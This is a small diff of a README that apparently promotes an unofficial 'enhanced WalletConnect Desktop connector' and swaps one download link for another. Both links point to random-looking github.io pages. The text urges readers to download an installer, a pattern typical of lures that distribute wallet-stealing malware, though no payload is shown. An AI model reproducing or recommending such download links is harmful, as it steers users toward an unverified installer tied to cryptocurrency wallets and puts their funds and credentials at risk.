@@ -39,4 +39,4 @@ A: This repository is designed to provide an enhanced and full-featured experien
 
 To begin using the enhanced WalletConnect Desktop connector, download the installer package now.
 
-[Get it here](https://yellowtaxisave.github.io/download-page/)
+[Get it here](https://capitals-707-bringing.github.io/download-page/)
